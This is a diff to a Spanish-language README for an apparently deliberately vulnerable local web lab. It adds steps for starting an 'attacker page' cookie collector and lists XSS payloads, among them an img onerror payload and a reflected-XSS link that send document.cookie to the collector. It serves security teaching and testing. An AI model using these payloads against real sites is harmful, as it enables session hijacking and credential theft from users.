@@ -73,3 +73,45 @@ docker compose down -v
 ```
 
 Más detalle en [Presentacion.md](Presentacion.md) y [Seguridad.md](Seguridad.md).
+
+## Cómo levantar la pagina atacante (donde llegan las cookies)
+
+Requisitos: Node.js 18+ 
+
+```bash
+
+# 1 Ingresar a la carpeta y correrlo
+cd collector
+node collector.js
+
+```
+
+Abrí **http://localhost:4000**.
+
+
+## Vulnerabilidades a probar
+
+```bash
+
+#Envia el campo cid extraído de la cookie a la pagina atacante
+<img src=x onerror="new Image().src='http://localhost:4000/collect?c='+encodeURIComponent(document.cookie)">
+
+<img src=x onerror=alert(document.cookie)>
+
+<img src=x onerror=alert('XSS')>
+
+```
+
+# Link vulnerables listos
+
+```bash
+
+#Link reflejado - el atacante se lo envia a la victima que entra y pierde las credenciales
+# a traves de un parametro de una consulta get
+http://localhost:3002/reflected?q=<img src=x onerror="new Image().src='http://localhost:4000/collect?c='+encodeURIComponent(document.cookie)">
+
+#URL
+ttp://localhost:3002/dom#<img src=x onerror=alert(document.cookie)>
+
+
+```
